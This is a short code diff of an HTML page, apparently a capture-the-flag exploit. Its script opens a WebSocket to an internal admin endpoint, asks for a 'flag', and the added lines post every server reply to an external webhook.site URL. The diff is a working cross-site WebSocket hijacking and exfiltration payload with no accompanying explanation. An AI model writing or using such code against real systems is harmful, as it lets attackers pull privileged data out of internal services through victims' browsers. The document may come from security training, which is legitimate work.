@@ -6,9 +6,19 @@
 </head>
 <body>
   <script>
+        const webhookURL = "https://webhook.site/308904c1-7e12-46fc-943f-7bf4747b9658";
         const ws = new WebSocket('ws://web:8080/admin/ws');
         ws.onopen = () => ws.send("flag");
-        ws.onmessage = (event) => console.log('Message received from server:', event.data);
+        ws.onmessage = (event) => {
+            const receivedMessage = event.data;
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ message: receivedMessage })
+            });
+        }
         ws.onerror = (error) => console.error('WebSocket error:', error);
     </script>
 </body>
